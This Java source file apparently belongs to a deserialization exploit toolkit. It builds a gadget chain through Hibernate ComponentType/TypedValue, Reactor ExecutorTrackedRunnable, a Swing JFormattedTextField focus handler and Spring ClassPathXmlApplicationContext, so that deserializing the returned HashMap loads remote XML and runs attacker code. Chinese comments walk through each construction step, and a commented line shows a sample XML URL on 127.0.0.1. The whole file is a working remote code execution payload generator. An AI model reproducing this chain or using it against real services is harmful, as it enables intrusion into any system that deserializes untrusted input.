package org.gadget;

import org.gadget.inter.Gadget;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.property.access.spi.Getter;
import org.hibernate.property.access.spi.GetterMethodImpl;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.ComponentType;
import sun.reflect.ReflectionFactory;

import javax.swing.*;
import javax.swing.text.DefaultFormatter;
import javax.swing.text.Document;
import javax.swing.text.PlainDocument;
import javax.swing.text.StringContent;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Hibernate_ClassPathXmlApplicationContextExec implements Gadget {
    public Object getObject(String command) throws Exception {
        DefaultFormatter defaultFormatter = new DefaultFormatter();
        defaultFormatter.setValueClass(Class.forName("org.springframework.context.support.ClassPathXmlApplicationContext"));
//        defaultFormatter.stringToValue("http://127.0.0.1:8000/1.xml");

        JFormattedTextField jFormattedTextField = new JFormattedTextField();
        setRefValue(jFormattedTextField,"format", defaultFormatter);

        //设置document，写入payload，反序列化时通过getText取出
        String poc = command;
        StringContent stringContent = new StringContent(poc.length());
        stringContent.insertString(0,poc);
        PlainDocument plainDocument = new PlainDocument(stringContent);
        jFormattedTextField.setDocument((Document) plainDocument);

        //构造JFormattedTextField$FocusLostHandler对象
        Class<?> focusLostHandlerClass = Class.forName("javax.swing.JFormattedTextField$FocusLostHandler");
        Constructor focusLostHandlerConstructor = focusLostHandlerClass.getDeclaredConstructor(JFormattedTextField.class);
        focusLostHandlerConstructor.setAccessible(true);
        Object focusLostHandler = focusLostHandlerConstructor.newInstance(jFormattedTextField);
        setRefValue(jFormattedTextField,"focusLostBehavior",0);

        //构造ExecutorScheduler$ExecutorTrackedRunnable对象，该对象执行run方法将执行命令
        Class<?> executorTrackedRunnableClass = Class.forName("reactor.core.scheduler.ExecutorScheduler$ExecutorTrackedRunnable");
        Constructor<?> sc2 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(executorTrackedRunnableClass, Object.class.getConstructor(new Class[0]));
        Object executorTrackedRunnable = sc2.newInstance(null);
        setRefValue(executorTrackedRunnable, "task" ,focusLostHandler);

        Method run = executorTrackedRunnable.getClass().getDeclaredMethod("run");
        run.setAccessible(true);

        //hibernate5反射执行
        Getter getterMethod = new GetterMethodImpl(executorTrackedRunnableClass,null,run);

        Class<?> aClass = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer");
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(aClass, Object.class.getConstructor(new Class[0]));
        PojoComponentTuplizer pojo= (PojoComponentTuplizer) sc.newInstance(null);
        Getter[] getters = {getterMethod};
        Class<?> aClass2 = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");
        Field getters1 = aClass2.getDeclaredField("getters");
        getters1.setAccessible(true);
        getters1.set(pojo,getters);

        //构造ComponentType
        Class<?> componentTypeClass = Class.forName("org.hibernate.type.ComponentType");
        Constructor<?> sc3 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(componentTypeClass, Object.class.getConstructor(new Class[0]));
        ComponentType componentType= (ComponentType) sc3.newInstance(null);
        Class aClass3 = componentType.getClass();
        Field propertySpan = aClass3.getDeclaredField("propertySpan");
        propertySpan.setAccessible(true);
        propertySpan.set(componentType,1);
        Field componentTuplizer = aClass3.getDeclaredField("componentTuplizer");
        componentTuplizer.setAccessible(true);
        componentTuplizer.set(componentType,pojo);

        /*构造TypedValue,在put进hashMap前不能够设置value属性，否则将会顺着
        构造链走下去执行命令后报错*/
        TypedValue typedValue = new TypedValue(componentType, null);

        //构造hashmap
        HashMap hashMap = new HashMap();
        hashMap.put(typedValue,"ababa");

        //反射设置TypedValue的value属性
        Class<? extends TypedValue> aClass4 = typedValue.getClass();
        Field value = aClass4.getDeclaredField("value");
        value.setAccessible(true);
        value.set(typedValue,executorTrackedRunnable);

        return hashMap;

    }

    private static void setRefValue(Object obj, String val, Object age) throws Exception {
        Field declaredField = obj.getClass().getDeclaredField(val);
        declaredField.setAccessible(true);
        declaredField.set(obj,age);
    }
}
